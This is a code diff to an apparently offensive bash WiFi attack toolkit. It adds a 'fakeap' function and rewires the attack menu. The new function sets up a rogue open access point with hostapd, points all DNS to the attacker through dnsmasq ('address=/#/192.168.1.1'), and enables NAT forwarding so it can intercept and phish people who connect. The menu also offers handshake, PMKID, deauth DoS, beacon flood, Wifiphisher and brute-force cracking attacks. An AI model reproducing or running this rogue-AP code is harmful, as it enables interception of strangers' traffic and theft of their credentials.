@@ -567,6 +567,44 @@ bannerattack() {
 	echo -e "               ${blueColour}."
 	$cleancolor
 }
+fakeap() {
+	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
+	echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
+	tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
+	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+	sleep 3
+	echo -e "interface=${tar}\n" > hostapd.conf
+	echo -e "driver=nl80211\n" >> hostapd.conf
+	echo -e "ssid=$ssid\n" >> hostapd.conf
+	echo -e "hw_mode=g\n" >> hostapd.conf
+	echo -e "channel=$ch\n" >> hostapd.conf
+	echo -e "macaddr_acl=0\n" >> hostapd.conf
+	echo -e "auth_algs=1\n" >> hostapd.conf
+	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
+	echo -e "\n$yellowColour[*]$grayColour Configuring interface $tar"
+	sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
+	hostapd hostapd.conf > /dev/null 2>&1 &
+	sleep 5
+	echo -e "${yellowColour}[*]${grayColour} Configuring dnsmasq..."
+	echo -e "interface=${tar}\n" > dnsmasq.conf
+	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
+	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
+	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
+	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
+	echo -e "log-queries\n" >> dnsmasq.conf
+	echo -e "log-dhcp\n" >> dnsmasq.conf
+	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
+	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+	sleep 1
+	ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
+	sleep 1
+	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+	sleep 3
+	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+	iptables --append FORWARD --in-interface $tar -j ACCEPT
+	xterm -hold -e "echo 1 > /proc/sys/net/ipv4/ip_forward" &
+}
 #banner main
 banner() {
 	echo "  _       __  _   ____  _      ____                               __      __ "
@@ -599,13 +637,13 @@ else
 		echo -e "${greenColour}\n[+]${grayColour} Network card: $tar"
 		echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
 		echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Fake Access Point\t\t${turquoiseColour}[+]${grayColour} Cracking password"
-		echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] Wifiphisher\t\t\t[8] Force Brute .cap"
-		echo -e "[2] PMKID Attack\t\t\t\t\t\t[9] Hashed Dictionary (Rainbow taibles)"
+		echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] Wifiphisher\t\t\t[9] Force Brute .cap"
+		echo -e "[2] PMKID Attack\t\t[8] Fake/Rogue AP\t\t\t[10] Hashed Dictionary (Rainbow taibles)"
 		echo -e "[3] DoS Attack"
 		echo -e "[4] Beacon Flood Attack"
 		echo -e "[5] Network traffic"
 		echo -e "[6] Scanner"
-		echo -e "\n[10] Exit and restart the network card\n"
+		echo -e "\n[99] Exit and restart the network card\n"
 		tput cnorm
 		echo -ne "${blueColour}[?]${grayColour} Attack: " && read opcion
 		$cleancolor
@@ -632,12 +670,15 @@ else
 			ntwkphishing
 			;;
 			8)
-			fuerza_.cap
+			fakeap
 			;;
 			9)
-			rainbowtaibles
+			fuerza_.cap
 			;;
 			10)
+			rainbowtaibles
+			;;
+			99)
 			exitresart
 			;;
 			*)
